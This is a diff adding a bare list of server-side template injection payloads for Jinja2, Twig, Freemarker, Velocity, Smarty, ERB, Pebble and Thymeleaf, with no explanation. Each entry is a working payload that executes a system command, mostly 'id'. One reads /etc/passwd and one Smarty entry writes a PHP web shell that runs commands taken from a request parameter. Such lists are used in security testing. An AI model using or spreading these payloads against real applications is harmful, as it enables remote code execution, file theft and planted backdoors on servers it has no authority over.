@@ -1,0 +1,52 @@
+# Jinja2 RCE
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}
+
+# Twig RCE
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
+{{['id']|filter('system')}}
+{{['id']|map('system')|join}}
+{{['id',1]|sort('system')|join}}
+{{{'id':1}|filter('system')}}
+
+# Freemarker RCE
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}
+<#assign classloader=object.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.utility.ObjectConstructor")><#assign owci=owc.newInstance()><#assign ec=owci("java.lang.ProcessBuilder","id")>${ec.start()}
+
+# Velocity RCE
+#set($x='')##
+#set($rt=$x.class.forName('java.lang.Runtime'))##
+#set($chr=$x.class.forName('java.lang.Character'))##
+#set($str=$x.class.forName('java.lang.String'))##
+#set($ex=$rt.getRuntime().exec('id'))##
+$ex.waitFor()
+#set($out=$ex.getInputStream())##
+#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+
+# Smarty RCE
+{php}system('id');{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{system('id')}
+{exec('id')}
+
+# ERB RCE
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').read %>
+<%= require 'open3'; Open3.capture2('id')[0] %>
+
+# Pebble RCE
+{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
+
+# Thymeleaf RCE
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}
+__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
